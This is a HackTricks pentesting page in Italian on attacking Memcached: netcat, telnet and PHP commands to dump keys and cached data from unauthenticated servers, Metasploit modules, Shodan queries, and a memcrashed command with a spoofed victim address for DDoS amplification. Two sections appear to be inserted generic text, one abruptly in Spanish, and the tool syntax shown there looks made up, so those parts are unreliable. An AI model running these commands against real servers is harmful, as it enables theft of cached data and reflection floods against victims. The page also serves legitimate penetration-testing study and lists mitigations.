# 11211 - Pentesting Memcache

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informazioni sul protocollo

Da [wikipedia](https://en.wikipedia.org/wiki/Memcached):

> **Memcached** (pronuncia: mem-cashed, mem-cash-dee) √® un sistema di [memoria cache](https://en.wikipedia.org/wiki/Memory\_caching) distribuita a uso generale. Spesso viene utilizzato per velocizzare siti web dinamici basati su database, memorizzando dati e oggetti in RAM per ridurre il numero di volte in cui √® necessario leggere una fonte di dati esterna (come un database o un'API).

Anche se Memcached supporta SASL, la maggior parte delle istanze √® **esposta senza autenticazione**.

**Porta predefinita:** 11211
```
PORT      STATE SERVICE
11211/tcp open  unknown
```
## Enumerazione

### Manuale

Per estrarre tutte le informazioni salvate all'interno di un'istanza di memcache, √® necessario:

1. Trovare le **slab** con **elementi attivi**
2. Ottenere i **nomi delle chiavi** delle slab rilevate in precedenza
3. Estrarre i **dati salvati** ottenendo i nomi delle chiavi

Ricorda che questo servizio √® solo una **cache**, quindi i **dati possono apparire e scomparire**.
```bash
echo "version" | nc -vn -w 1 <IP> 11211      #Get version
echo "stats" | nc -vn -w 1 <IP> 11211        #Get status
echo "stats slabs" | nc -vn -w 1 <IP> 11211  #Get slabs
echo "stats items" | nc -vn -w 1 <IP> 11211  #Get items of slabs with info
echo "stats cachedump <number> 0" | nc -vn -w 1 <IP> 11211  #Get key names (the 0 is for unlimited output size)
echo "get <item_name>" | nc -vn -w 1 <IP> 11211  #Get saved info

#This php will just dump the keys, you need to use "get <item_name> later"
sudo apt-get install php-memcached
php -r '$c = new Memcached(); $c->addServer("localhost", 11211); var_dump( $c->getAllKeys() );'
```
### Manuale2

Memcached √® un sistema di caching distribuito ad alte prestazioni utilizzato per accelerare le applicazioni web. Tuttavia, a causa di configurazioni errate o vulnerabilit√†, pu√≤ essere sfruttato da un attaccante per ottenere informazioni sensibili o eseguire attacchi di amplificazione.

#### Scansione delle porte

Per identificare i server Memcached in esecuzione su una rete, √® possibile eseguire una scansione delle porte utilizzando uno strumento come Nmap:

```
nmap -p 11211 <indirizzo_IP>
```

#### Verifica dell'accesso anonimo

Per verificare se un server Memcached consente l'accesso anonimo, √® possibile utilizzare il comando `telnet`:

```
telnet <indirizzo_IP> 11211
```

Se la connessione riesce senza richiedere alcuna autenticazione, il server Memcached √® configurato per consentire l'accesso anonimo.

#### Esecuzione di comandi Memcached

Una volta connessi a un server Memcached, √® possibile eseguire comandi utilizzando la sintassi specifica di Memcached. Ad esempio, per ottenere il valore di una chiave, √® possibile utilizzare il comando `get`:

```
get <chiave>
```

Per impostare il valore di una chiave, √® possibile utilizzare il comando `set`:

```
set <chiave> 0 0 <lunghezza_valore>
<valore>
```

#### Attacchi di amplificazione

Memcached pu√≤ essere utilizzato per eseguire attacchi di amplificazione, sfruttando la sua capacit√† di memorizzare grandi quantit√† di dati in memoria. Gli attaccanti possono inviare richieste falsificate con l'indirizzo IP della vittima come mittente, facendo s√¨ che il server Memcached invii una risposta molto pi√π grande alla vittima.

Per eseguire un attacco di amplificazione Memcached, √® possibile utilizzare uno strumento come `memcrashed`:

```
python memcrashed.py --target <indirizzo_IP> --port 11211 --method amplification --spoof <indirizzo_IP_vittima>
```

#### Protezione e mitigazione

Per proteggere i server Memcached da attacchi di amplificazione, √® possibile adottare le seguenti misure:

- Disabilitare l'accesso anonimo e richiedere l'autenticazione per accedere al server Memcached.
- Configurare un firewall per bloccare l'accesso al server Memcached dalle fonti non autorizzate.
- Limitare la quantit√† di memoria utilizzata da Memcached per evitare l'amplificazione delle risposte.
- Aggiornare regolarmente Memcached e monitorare le vulnerabilit√† note.

#### Conclusioni

Memcached pu√≤ essere un'utile risorsa per migliorare le prestazioni delle applicazioni web, ma √® importante configurarlo correttamente e proteggerlo da potenziali attacchi. Conoscere le tecniche di hacking associate a Memcached pu√≤ aiutare a identificare e mitigare le vulnerabilit√†.
```bash
sudo apt install libmemcached-tools
memcstat --servers=127.0.0.1 #Get stats
memcdump --servers=127.0.0.1 #Get all items
memccat  --servers=127.0.0.1 <item1> <item2> <item3> #Get info inside the item(s)
```
### Automatico

Memcached es un sistema de almacenamiento en cach√© de objetos de alto rendimiento que se utiliza com√∫nmente en aplicaciones web para mejorar el rendimiento y reducir la carga en la base de datos. Sin embargo, tambi√©n puede ser una fuente potencial de vulnerabilidades en la seguridad si no se configura correctamente.

Este m√≥dulo de Metasploit automatiza el proceso de explotaci√≥n de una vulnerabilidad de Memcached conocida como "memcrashed". Esta vulnerabilidad permite a un atacante realizar ataques de amplificaci√≥n de reflexi√≥n DDoS, lo que puede resultar en una interrupci√≥n del servicio.

Para utilizar este m√≥dulo, simplemente especifique la direcci√≥n IP de la v√≠ctima y la direcci√≥n IP del servidor Memcached que se utilizar√° para realizar el ataque. El m√≥dulo enviar√° una solicitud especial al servidor Memcached, que luego se amplificar√° y se enviar√° a la direcci√≥n IP de la v√≠ctima, abrumando su conexi√≥n a Internet y causando una interrupci√≥n del servicio.

Es importante tener en cuenta que este m√≥dulo solo debe utilizarse con fines educativos o en entornos controlados donde se haya obtenido el consentimiento del propietario del sistema. El uso indebido de esta herramienta puede ser ilegal y puede tener consecuencias legales graves.

Para obtener m√°s informaci√≥n sobre c√≥mo protegerse contra ataques de amplificaci√≥n de reflexi√≥n DDoS y c√≥mo configurar correctamente su servidor Memcached, consulte la documentaci√≥n oficial de Memcached y las mejores pr√°cticas de seguridad en l√≠nea.
```bash
nmap -n -sV --script memcached-info -p 11211 <IP>   #Just gather info
msf > use auxiliary/gather/memcached_extractor      #Extracts saved data
msf > use auxiliary/scanner/memcached/memcached_amp #Check is UDP DDoS amplification attack is possible
```
## **Dumping delle chiavi di Memcache**

Nel mondo di Memcache, un protocollo che aiuta nell'organizzazione dei dati per classi di slab, esistono comandi specifici per ispezionare i dati memorizzati, sebbene con notevoli limitazioni:

1. Le chiavi possono essere dumpate solo per classe di slab, raggruppando le chiavi di dimensioni simili.
2. Esiste un limite di una pagina per classe di slab, corrispondente a 1MB di dati.
3. Questa funzionalit√† √® non ufficiale e potrebbe essere interrotta in qualsiasi momento, come discusso nei [forum della comunit√†](https://groups.google.com/forum/?fromgroups=#!topic/memcached/1-T8I-RVGKM).

La limitazione di poter dumpare solo 1MB da potenzialmente gigabyte di dati √® particolarmente significativa. Tuttavia, questa funzionalit√† pu√≤ ancora offrire informazioni sui modelli di utilizzo delle chiavi, a seconda delle esigenze specifiche. Per coloro che sono meno interessati alla meccanica, una visita alla [sezione degli strumenti](https://lzone.de/cheat-sheet/memcached#tools) rivela utility per il dump completo. In alternativa, il processo di utilizzo di telnet per l'interazione diretta con le configurazioni di memcached √® descritto di seguito.

### **Come funziona**

L'organizzazione della memoria di Memcache √® fondamentale. Avviare Memcache con l'opzione "-vv" rivela le classi di slab che genera, come mostrato di seguito:
```bash
$ memcached -vv
slab class   1: chunk size        96 perslab   10922
[...]
```
Per visualizzare tutte le slab attualmente esistenti, viene utilizzato il seguente comando:
```bash
stats slabs
```
Aggiungere una singola chiave a memcached 1.4.13 illustra come le classi di slab vengono popolate e gestite. Ad esempio:
```bash
set mykey 0 60 1
1
STORED
```
Eseguendo il comando "stats slabs" dopo l'aggiunta di una chiave si ottengono statistiche dettagliate sull'utilizzo delle slab:
```bash
stats slabs
[...]
```
Questo output rivela i tipi di slab attivi, i chunk utilizzati e le statistiche operative, offrendo informazioni sull'efficienza delle operazioni di lettura e scrittura.

Un altro comando utile, "stats items", fornisce dati su evictions, limiti di memoria e cicli di vita degli elementi:
```bash
stats items
[...]
```
Queste statistiche consentono di fare ipotesi informate sul comportamento della cache dell'applicazione, inclusa l'efficienza della cache per diverse dimensioni dei contenuti, l'allocazione della memoria e la capacit√† di memorizzare grandi oggetti.

### **Dumping delle chiavi**

Per le versioni precedenti alla 1.4.31, le chiavi vengono scaricate utilizzando la classe slab tramite:
```bash
stats cachedump <slab class> <number of items to dump>
```
Per esempio, per scaricare una chiave nella classe #1:
```bash
stats cachedump 1 1000
ITEM mykey [1 b; 1350677968 s]
END
```
Questo metodo itera sulle classi di slab, estrae e opzionalmente scarica i valori delle chiavi.

### **SCARICARE LE CHIAVI DI MEMCACHE (VER 1.4.31+)**

Con la versione di memcache 1.4.31 e successiva, viene introdotto un nuovo metodo pi√π sicuro per scaricare le chiavi in un ambiente di produzione, utilizzando la modalit√† non bloccante come descritto nelle [note di rilascio](https://github.com/memcached/memcached/wiki/ReleaseNotes1431). Questo approccio genera un output esteso, quindi si consiglia di utilizzare il comando 'nc' per migliorare l'efficienza. Esempi includono:
```bash
echo 'lru_crawler metadump all' | nc 127.0.0.1 11211 | head -1
echo 'lru_crawler metadump all' | nc 127.0.0.1 11211 | grep ee6ba58566e234ccbbce13f9a24f9a28
```
### **STRUMENTI DI DUMPING**

Tabella [da qui](https://lzone.de/blog).

| Linguaggi di programmazione | Strumenti                                                                                                                           | Funzionalit√†                                                                                                                                                           |                                                                             |         |
| -------------------------- | ----------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------- | ------- |
| PHP                        | [script semplice](http://snipt.org/xtP)                                                                                              | Stampa i nomi delle chiavi.                                                                                                                                            |                                                                             |         |
| Perl                       | [script semplice](https://wiki.jasig.org/download/attachments/13572172/memcached-clean.pl?version=1\&modificationDate=1229693957401) | Stampa le chiavi e i valori.                                                                                                                                           |                                                                             |         |
| Ruby                       | [script semplice](https://gist.github.com/1365005)                                                                                   | Stampa i nomi delle chiavi.                                                                                                                                            |                                                                             |         |
| Perl                       | [memdump](https://search.cpan.org/\~dmaki/Memcached-libmemcached-0.4202/src/libmemcached/docs/memdump.pod)                         | Strumento nel modulo CPAN                                                                                                                                             | [Memcached-libmemcached](https://search.cpan.org/\~dmaki/Memcached-libmemc) | ached/) |
| PHP                        | [memcache.php](http://livebookmark.net/journal/2008/05/21/memcachephp-stats-like-apcphp/)                                          | GUI di monitoraggio di Memcache che consente anche di eseguire il dumping delle chiavi                                                                                |                                                                             |         |
| libmemcached               | [peep](http://blog.evanweaver.com/2009/04/20/peeping-into-memcached/)                                                              | **Congela il processo memcached!!!** Stai attento quando lo usi in produzione. Tuttavia, utilizzandolo, puoi aggirare il limite di 1 MB e scaricare **tutte** le chiavi. |                                                                             |         |

## Risoluzione dei problemi <a href="#troubleshooting" id="troubleshooting"></a>

### Limite dati di 1 MB <a href="#1mb-data-limit" id="1mb-data-limit"></a>

Nota che prima di memcached 1.4 non puoi memorizzare oggetti pi√π grandi di 1 MB a causa della dimensione massima predefinita dello slab.

### Non impostare mai un timeout > 30 giorni! <a href="#never-set-a-timeout--30-days" id="never-set-a-timeout--30-days"></a>

Se provi a "set" o "add" una chiave con un timeout maggiore del massimo consentito, potresti non ottenere ci√≤ che ti aspetti perch√© memcached tratta il valore come un timestamp Unix. Inoltre, se il timestamp √® nel passato, non far√† nulla. Il tuo comando fallir√† silenziosamente.

Quindi, se vuoi utilizzare il tempo di vita massimo, specifica 2592000. Esempio:
```
set my_key 0 2592000 1
1
```
### Chiavi che scompaiono in caso di overflow <a href="#disappearing-keys-on-overflow" id="disappearing-keys-on-overflow"></a>

Nonostante la documentazione dica qualcosa riguardo al superamento di 64 bit, che causa la scomparsa di un valore utilizzando "incr", √® necessario crearlo nuovamente utilizzando "add" / "set".

### Replicazione <a href="#replication" id="replication"></a>

memcached stesso non supporta la replicazione. Se ne hai davvero bisogno, devi utilizzare soluzioni di terze parti:

* [repcached](http://repcached.lab.klab.org/): replicazione asincrona multi-master (patch set memcached 1.2)
* [Interfaccia memcached di Couchbase](http://www.couchbase.com/memcached): utilizza CouchBase come sostituto di memcached
* [yrmcds](https://cybozu.github.io/yrmcds/): archivio chiave-valore Master-Slave compatibile con memcached
* [twemproxy](https://github.com/twitter/twemproxy) (aka nutcracker): proxy con supporto memcached

### Comandi Cheat-Sheet

{% content-ref url="memcache-commands.md" %}
[memcache-commands.md](memcache-commands.md)
{% endcontent-ref %}

### **Shodan**

* `port:11211 "STAT pid"`
* `"STAT pid"`

## Riferimenti

* [https://lzone.de/cheat-sheet/memcached](https://lzone.de/cheat-sheet/memcached)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
